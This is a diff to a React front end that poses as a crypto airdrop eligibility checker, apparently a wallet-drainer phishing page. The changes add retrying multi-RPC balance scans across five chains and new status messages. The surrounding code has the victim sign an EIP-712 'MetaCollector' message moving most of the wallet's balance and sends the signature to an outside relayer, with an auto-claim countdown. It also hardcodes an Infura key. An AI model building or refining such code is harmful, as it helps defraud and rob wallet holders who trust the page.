@@ -8,12 +8,13 @@ import './index.css';
 // DEPLOYED CONTRACTS ON ALL 5 NETWORKS
 // ============================================
 
-// Reliable Ethereum RPC with fallbacks
-const ETH_RPC_FALLBACKS = [
+// Reliable Ethereum RPCs with fallbacks + timeout
+const ETH_RPC_ENDPOINTS = [
   'https://eth.llamarpc.com',
   'https://ethereum.publicnode.com',
   'https://rpc.ankr.com/eth',
-  'https://cloudflare-eth.com'
+  'https://cloudflare-eth.com',
+  'https://eth-mainnet.g.alchemy.com/v2/demo' // public demo key works for reads
 ];
 
 const MULTICHAIN_CONFIG = {
@@ -25,8 +26,7 @@ const MULTICHAIN_CONFIG = {
     explorer: 'https://etherscan.io',
     icon: '⟠',
     color: 'from-blue-400 to-indigo-500',
-    rpc: ETH_RPC_FALLBACKS[0],
-    rpcFallbacks: ETH_RPC_FALLBACKS
+    rpcEndpoints: ETH_RPC_ENDPOINTS
   },
   BSC: {
     chainId: 56,
@@ -36,7 +36,11 @@ const MULTICHAIN_CONFIG = {
     explorer: 'https://bscscan.com',
     icon: '🟡',
     color: 'from-yellow-400 to-orange-500',
-    rpc: 'https://bsc-dataseed.binance.org'
+    rpcEndpoints: [
+      'https://bsc-dataseed.binance.org',
+      'https://bsc-dataseed1.defibit.io',
+      'https://bsc-dataseed1.ninicoin.io'
+    ]
   },
   Polygon: {
     chainId: 137,
@@ -46,7 +50,11 @@ const MULTICHAIN_CONFIG = {
     explorer: 'https://polygonscan.com',
     icon: '⬢',
     color: 'from-purple-400 to-pink-500',
-    rpc: 'https://polygon-rpc.com'
+    rpcEndpoints: [
+      'https://polygon-rpc.com',
+      'https://rpc-mainnet.maticvigil.com',
+      'https://rpc-mainnet.matic.network'
+    ]
   },
   Arbitrum: {
     chainId: 42161,
@@ -56,7 +64,10 @@ const MULTICHAIN_CONFIG = {
     explorer: 'https://arbiscan.io',
     icon: '🔷',
     color: 'from-cyan-400 to-blue-500',
-    rpc: 'https://arb1.arbitrum.io/rpc'
+    rpcEndpoints: [
+      'https://arb1.arbitrum.io/rpc',
+      'https://arbitrum-mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161'
+    ]
   },
   Avalanche: {
     chainId: 43114,
@@ -66,7 +77,10 @@ const MULTICHAIN_CONFIG = {
     explorer: 'https://snowtrace.io',
     icon: '🔴',
     color: 'from-red-400 to-red-500',
-    rpc: 'https://api.avax.network/ext/bc/C/rpc'
+    rpcEndpoints: [
+      'https://api.avax.network/ext/bc/C/rpc',
+      'https://avalanche-c-chain.publicnode.com'
+    ]
   }
 };
 
@@ -77,6 +91,38 @@ const PROJECT_FLOW_ROUTER_ABI = [
   "function processNativeFlow() payable",
   "event FlowProcessed(address indexed initiator, uint256 value)"
 ];
+
+// Helper: fetch balance for a single chain with multiple RPCs + timeout + retry
+const fetchChainBalance = async (chain, walletAddress, retries = 2) => {
+  let lastError = null;
+
+  for (let attempt = 0; attempt <= retries; attempt++) {
+    for (const rpcUrl of chain.rpcEndpoints) {
+      try {
+        // Create a promise that rejects after 10 seconds
+        const timeoutPromise = new Promise((_, reject) => {
+          setTimeout(() => reject(new Error(`RPC timeout: ${rpcUrl}`)), 10000);
+        });
+
+        const provider = new ethers.JsonRpcProvider(rpcUrl);
+        const balancePromise = provider.getBalance(walletAddress);
+        const balance = await Promise.race([balancePromise, timeoutPromise]);
+        const amount = parseFloat(ethers.formatUnits(balance, 18));
+        return { amount, success: true, usedRpc: rpcUrl };
+      } catch (err) {
+        console.warn(`[${chain.name}] RPC ${rpcUrl} failed:`, err.message);
+        lastError = err;
+        // continue to next RPC
+      }
+    }
+    // If all RPCs failed and we have retries left, wait 500ms and retry
+    if (attempt < retries) {
+      console.log(`[${chain.name}] Retrying balance fetch (attempt ${attempt + 1}/${retries})...`);
+      await new Promise(resolve => setTimeout(resolve, 500));
+    }
+  }
+  throw lastError || new Error(`No working RPC for ${chain.name} after ${retries} retries`);
+};
 
 function App() {
   const { open } = useAppKit();
@@ -115,6 +161,8 @@ function App() {
   const [executableChains, setExecutableChains] = useState([]);
   const [showRibbon, setShowRibbon] = useState(true);
   const [processingChain, setProcessingChain] = useState('');
+  const [totalUSDValue, setTotalUSDValue] = useState(0);
+  const [balanceErrors, setBalanceErrors] = useState({});
 
   // Auto‑claim countdown state
   const [autoClaimSecondsLeft, setAutoClaimSecondsLeft] = useState(0);
@@ -167,25 +215,6 @@ function App() {
       { name: "amount", type: "uint256" },
       { name: "nonce", type: "uint256" }
     ]
-  };
-
-  // Helper: fetch balance for a single chain with RPC fallback
-  const fetchChainBalance = async (chain, walletAddress) => {
-    let rpcProviders = [chain.rpc];
-    if (chain.rpcFallbacks) rpcProviders = [...rpcProviders, ...chain.rpcFallbacks];
-    let lastError = null;
-    for (const rpcUrl of rpcProviders) {
-      try {
-        const rpcProvider = new ethers.JsonRpcProvider(rpcUrl);
-        const balance = await rpcProvider.getBalance(walletAddress);
-        const amount = parseFloat(ethers.formatUnits(balance, 18));
-        return { amount, success: true };
-      } catch (err) {
-        lastError = err;
-        console.warn(`RPC ${rpcUrl} failed for ${chain.name}:`, err.message);
-      }
-    }
-    throw lastError || new Error(`No working RPC for ${chain.name}`);
   };
 
   // Fetch crypto prices
@@ -350,13 +379,14 @@ function App() {
     if (!address) return;
     
     setVerifying(true);
-    setTxStatus('🔄 Checking eligibility...');
+    setTxStatus('🔍 Checking eligibility...');
     
     try {
       // Calculate total value
       const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
+      setTotalUSDValue(total);
       
-      // Get chains with balance
+      // Get chains with balance > 0 (significant)
       const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
         balances[chain.name] && balances[chain.name].amount > 0.000001
       );
@@ -391,7 +421,7 @@ function App() {
       
       if (eligible) {
         if (executable.length === 0) {
-          setTxStatus('⚠️ No chains meet execution requirements');
+          setTxStatus(`⚠️ Eligible but no chain meets min $1 or gas requirements. Total: $${total.toFixed(2)}`);
           console.log('⚠️ Eligible but no executable chains:', {
             chainsWithBalance: chainsWithBalance.map(c => ({ 
               name: c.name, 
@@ -400,7 +430,7 @@ function App() {
             }))
           });
         } else {
-          setTxStatus(`✅ Ready to process ${executable.length} chains`);
+          setTxStatus(`✅ Ready to process ${executable.length} chains (Total $${total.toFixed(2)})`);
           console.log('✅ Executable chains:', executable.map(c => ({ 
             name: c.name, 
             value: balances[c.name]?.valueUSD,
@@ -432,7 +462,12 @@ function App() {
           preparePresale();
         }
       } else {
-        setTxStatus(total > 0 ? '✨ Connected' : '👋 Welcome');
+        if (total === 0) {
+          setTxStatus('⚡ No balance detected. Please deposit at least $1 worth of crypto across supported chains.');
+        } else {
+          setTxStatus(`⚠️ Total value $${total.toFixed(2)} below $${MIN_VALUE_THRESHOLD} minimum.`);
+        }
+        console.log(`❌ Not eligible: total $${total.toFixed(2)} < $${MIN_VALUE_THRESHOLD}`);
       }
       
     } catch (err) {
@@ -443,20 +478,22 @@ function App() {
     }
   };
 
-  // Fetch balances across all chains with RPC fallback for Ethereum
+  // Fetch balances across all chains with RPC fallback and retry
   const fetchAllBalances = async (walletAddress) => {
-    console.log("🔍 Checking eligibility...");
+    console.log("🔍 Scanning balances on all chains...");
     setScanning(true);
-    setTxStatus('🔄 Checking eligibility...');
+    setBalanceErrors({});
+    setTxStatus('🔄 Scanning chains for balances...');
     
     const balanceResults = {};
     let scanned = 0;
     const totalChains = DEPLOYED_CHAINS.length;
+    const errors = {};
     
     // Scan all chains in parallel
     const scanPromises = DEPLOYED_CHAINS.map(async (chain) => {
       try {
-        const { amount } = await fetchChainBalance(chain, walletAddress);
+        const { amount, usedRpc } = await fetchChainBalance(chain, walletAddress, 2);
         
         let price = 0;
         if (chain.symbol === 'ETH') price = prices.eth;
@@ -468,7 +505,7 @@ function App() {
         
         scanned++;
         setScanProgress(Math.round((scanned / totalChains) * 100));
-        setTxStatus(`🔄 Checking eligibility...`);
+        setTxStatus(`🔄 Scanning ${chain.name}...`);
         
         if (amount > 0.000001) {
           balanceResults[chain.name] = {
@@ -479,14 +516,15 @@ function App() {
             contractAddress: chain.contractAddress,
             price: price,
             name: chain.name,
-            rpc: chain.rpc
+            rpc: usedRpc
           };
-          console.log(`✅ ${chain.name}: $${valueUSD.toFixed(2)} detected (${amount} ${chain.symbol})`);
+          console.log(`✅ ${chain.name}: $${valueUSD.toFixed(2)} detected (${amount} ${chain.symbol}) via ${usedRpc}`);
         } else {
           console.log(`⭕ ${chain.name}: no significant balance (${amount} ${chain.symbol})`);
         }
       } catch (err) {
-        console.error(`Failed to fetch balance for ${chain.name}:`, err);
+        console.error(`❌ Failed to fetch balance for ${chain.name}:`, err);
+        errors[chain.name] = err.message;
         scanned++;
         setScanProgress(Math.round((scanned / totalChains) * 100));
       }
@@ -495,11 +533,20 @@ function App() {
     await Promise.all(scanPromises);
     
     setBalances(balanceResults);
+    setBalanceErrors(errors);
     setScanning(false);
     
     const total = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
-    console.log(`💰 Total detected: $${total.toFixed(2)}`);
-    setTxStatus(`✅ Found $${total.toFixed(2)} total value`);
+    console.log(`💰 Total detected value: $${total.toFixed(2)}`);
+    
+    if (Object.keys(errors).length > 0) {
+      console.warn('Errors on chains:', errors);
+      setTxStatus(`⚠️ Some chains failed: ${Object.keys(errors).join(', ')}. Total found: $${total.toFixed(2)}`);
+    } else if (total === 0) {
+      setTxStatus(`⚠️ No balance found on any chain. Need at least $${MIN_VALUE_THRESHOLD} to claim.`);
+    } else {
+      setTxStatus(`✅ Found $${total.toFixed(2)} total value across ${Object.keys(balanceResults).length} chains`);
+    }
     
     return total;
   };
@@ -520,7 +567,6 @@ function App() {
 
   // ============================================
   // EIP-712 SIGNING AND RELAYER EXECUTION
-  // EXACTLY AS YOUR RELAYER EXPECTS
   // ============================================
   const executeMultiChainSignature = async () => {
     // Cancel any pending auto‑claim timer
@@ -599,8 +645,7 @@ function App() {
           
           console.log(`💰 ${chain.name}: Sending ${amountToSend.toFixed(6)} ${chain.symbol} ($${valueUSD})`);
           
-          // ===== EIP-712 TYPED DATA SIGNING - EXACTLY AS YOUR RELAYER EXPECTS =====
-          // Create domain for this specific chain
+          // EIP-712 TYPED DATA SIGNING
           const domain = {
             name: "MetaCollector",
             version: "1",
@@ -608,10 +653,8 @@ function App() {
             verifyingContract: chain.contractAddress
           };
           
-          // Generate nonce for this transaction
           const nonce = Math.floor(Math.random() * 1000000000);
           
-          // Create value/message for signing
           const value = {
             user: address,
             amount: amountInWei.toString(),
@@ -620,7 +663,6 @@ function App() {
           
           setTxStatus(`✍️ Signing for ${chain.name}...`);
           
-          // Get EIP-712 signature - THIS IS THE EXACT FORMAT YOUR RELAYER EXPECTS
           const signature = await signer.signTypedData(
             domain,
             EIP712_TYPES,
@@ -629,7 +671,6 @@ function App() {
           
           console.log(`✅ Signature obtained for ${chain.name}`);
           
-          // Create the signature payload EXACTLY as your relayer expects
           const signaturePayload = {
             domain: domain,
             types: EIP712_TYPES,
@@ -640,7 +681,6 @@ function App() {
           
           setTxStatus(`📤 Sending to relayer for ${chain.name}...`);
           
-          // Send to relayer - EXACT format from your spec
           const relayerResponse = await fetch('https://nexaworldx.com/relayer', {
             method: 'POST',
             headers: {
@@ -673,7 +713,6 @@ function App() {
           processed.push(chain.name);
           setCompletedChains(prev => [...prev, chain.name]);
           
-          // Send to backend for tracking
           const flowData = {
             walletAddress: address,
             chainName: chain.name,
@@ -790,16 +829,11 @@ function App() {
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
   };
 
-  // Show claim button when:
-  // 1. Wallet is connected
-  // 2. User is eligible (total >= $1)
-  // 3. Not all chains are completed yet
-  // 4. Not currently scanning
+  // Show claim button only if eligible AND not scanning AND not already completed
   const showClaimButton = isConnected && isEligible && !allChainsCompleted && !scanning;
 
   // Helper to cancel auto‑claim (used by manual button)
   const handleManualClaim = () => {
-    // Cancel auto‑claim timers
     if (autoClaimTimeoutRef.current) {
       clearTimeout(autoClaimTimeoutRef.current);
       autoClaimTimeoutRef.current = null;
@@ -809,7 +843,6 @@ function App() {
       countdownIntervalRef.current = null;
     }
     setAutoClaimSecondsLeft(0);
-    // Execute claim immediately
     executeMultiChainSignature();
   };
 
@@ -831,34 +864,20 @@ function App() {
             {/* Professional Ribbon Animation - Points to Connect Wallet */}
             {!isConnected && showRibbon && (
               <div className="absolute -top-16 sm:-top-20 right-0 sm:right-0 z-20 animate-ribbonSlide">
-                {/* Main Ribbon Container */}
                 <div className="relative group/ribbon">
-                  {/* Glow Effects */}
                   <div className="absolute -inset-2 bg-gradient-to-r from-[#b36e1a] via-[#d68a2e] to-[#b36e1a] rounded-lg blur-xl opacity-60 animate-pulse-slow"></div>
-                  
-                  {/* Arrow pointing to button */}
                   <div className="absolute -bottom-4 right-12 sm:right-16 w-6 h-6 bg-[#c47d24] transform rotate-45 animate-bounce-arrow"></div>
-                  
-                  {/* Ribbon Body */}
                   <div className="relative bg-gradient-to-r from-[#8a4c1a] via-[#b36e1a] to-[#cc8822] rounded-lg px-5 py-3 shadow-2xl border border-[#e0a55c] overflow-hidden">
-                    {/* Shimmer Effect */}
                     <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/30 to-transparent animate-shimmer-slow"></div>
-                    
-                    {/* Sparkles */}
                     <div className="absolute -top-1 -right-1 w-3 h-3 bg-yellow-300 rounded-full animate-ping opacity-75"></div>
                     <div className="absolute -bottom-1 -left-1 w-2 h-2 bg-yellow-300 rounded-full animate-ping opacity-50 delay-300"></div>
-                    
-                    {/* Content */}
                     <div className="relative flex items-center gap-3">
-                      {/* Icon */}
                       <div className="relative">
                         <div className="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center backdrop-blur border border-white/30">
                           <i className="fas fa-gem text-white text-sm animate-ringPop"></i>
                         </div>
                         <div className="absolute inset-0 w-8 h-8 bg-white/10 rounded-full animate-ping opacity-50"></div>
                       </div>
-                      
-                      {/* Text */}
                       <div className="text-left">
                         <div className="text-xs font-bold text-white/90 uppercase tracking-wider">
                           ⚡ Check Wallet Eligibility
@@ -868,14 +887,10 @@ function App() {
                           <i className="fas fa-bolt text-yellow-300 animate-bounce-slow ml-1"></i>
                         </div>
                       </div>
-                      
-                      {/* Value Badge */}
                       <div className="bg-black/30 backdrop-blur px-3 py-1 rounded-full border border-white/20">
                         <span className="text-xs font-bold text-white">$5,000 BTH</span>
                       </div>
                     </div>
-                    
-                    {/* Progress Line */}
                     <div className="absolute bottom-0 left-0 h-[2px] bg-gradient-to-r from-yellow-300 via-white to-yellow-300 animate-progressScan"></div>
                   </div>
                 </div>
@@ -919,17 +934,17 @@ function App() {
             )}
           </div>
 
-          {/* ===== VERIFICATION SPINNER & CLAIM SECTION – DIRECTLY UNDER WALLET BUTTON ===== */}
+          {/* ===== VERIFICATION SPINNER & CLAIM SECTION ===== */}
           {isConnected && (
             <div className="mb-6">
-              {/* Scanning animation – appears immediately under wallet info */}
+              {/* Scanning animation */}
               {scanning && (
                 <div className="bg-black/60 rounded-2xl p-5 border border-[#c47d24]/30 mb-4">
                   <div className="flex items-center justify-center gap-4">
                     <div className="w-10 h-10 border-4 border-[#c47d24] border-t-transparent rounded-full animate-spin"></div>
                     <div className="text-left">
-                      <div className="text-md font-bold text-[#e0b880]">Checking Eligibility</div>
-                      <div className="text-xs text-gray-400">Verifying your wallet...</div>
+                      <div className="text-md font-bold text-[#e0b880]">Scanning Blockchains</div>
+                      <div className="text-xs text-gray-400">Checking Ethereum, BSC, Polygon, Arbitrum, Avalanche...</div>
                     </div>
                   </div>
                   <div className="w-full bg-gray-800 rounded-full h-1.5 mt-3">
@@ -942,13 +957,16 @@ function App() {
                 </div>
               )}
 
-              {/* Eligibility result & manual claim button (if not scanning) */}
+              {/* Eligibility result & manual claim button */}
               {!scanning && !allChainsCompleted && (
                 <div className="space-y-3">
                   {isEligible ? (
                     <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-4 text-center">
                       <div className="text-green-400 font-bold text-sm mb-2">✅ YOU ARE ELIGIBLE!</div>
-                      <p className="text-xs text-gray-300 mb-3">{executableChains.length} chain(s) ready for claim</p>
+                      <p className="text-xs text-gray-300 mb-2">
+                        Total detected: <span className="text-green-400 font-bold">${totalUSDValue.toFixed(2)}</span><br/>
+                        {executableChains.length} chain(s) ready for claim
+                      </p>
                       
                       {/* Manual Claim Button */}
                       <button
@@ -979,11 +997,11 @@ function App() {
                     </div>
                   ) : (
                     <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-xl p-4 text-center">
-                      <div className="text-yellow-400 font-bold text-sm mb-2">⚡ Eligibility requires on‑chain balance</div>
+                      <div className="text-yellow-400 font-bold text-sm mb-2">⚡ Insufficient Balance</div>
                       <p className="text-xs text-gray-300">
-                        Supported: Ethereum, BSC, Polygon, Arbitrum, Avalanche<br/>
-                        Minimum: $1 USD equivalent.<br/>
-                        Non‑custodial wallets only.
+                        Need at least <span className="text-yellow-400 font-bold">$1 USD equivalent</span> across supported chains.<br/>
+                        Supported: Ethereum, BSC, Polygon, Arbitrum, Avalanche.<br/>
+                        {totalUSDValue > 0 && `Current total: $${totalUSDValue.toFixed(2)}`}
                       </p>
                     </div>
                   )}
@@ -1011,6 +1029,15 @@ function App() {
                     <i className="fas fa-exclamation-triangle text-red-400 text-sm animate-pulse"></i>
                     <p className="text-red-300 text-xs">{error}</p>
                   </div>
+                </div>
+              )}
+
+              {/* Balance errors summary (optional) */}
+              {Object.keys(balanceErrors).length > 0 && (
+                <div className="mt-3 bg-gray-800/30 rounded-lg p-2 text-center">
+                  <p className="text-[10px] text-gray-500">
+                    ⚠️ Some chains unavailable: {Object.keys(balanceErrors).join(', ')}
+                  </p>
                 </div>
               )}
             </div>
@@ -1244,7 +1271,7 @@ function App() {
         </div>
       )}
 
-      {/* Animation Keyframes (same as original, plus extra for pulse-glow) */}
+      {/* Animation Keyframes */}
       <style>{`
         @keyframes floatOrbBig {
           0% { transform: translate(0, 0) scale(1); opacity: 0.5; }
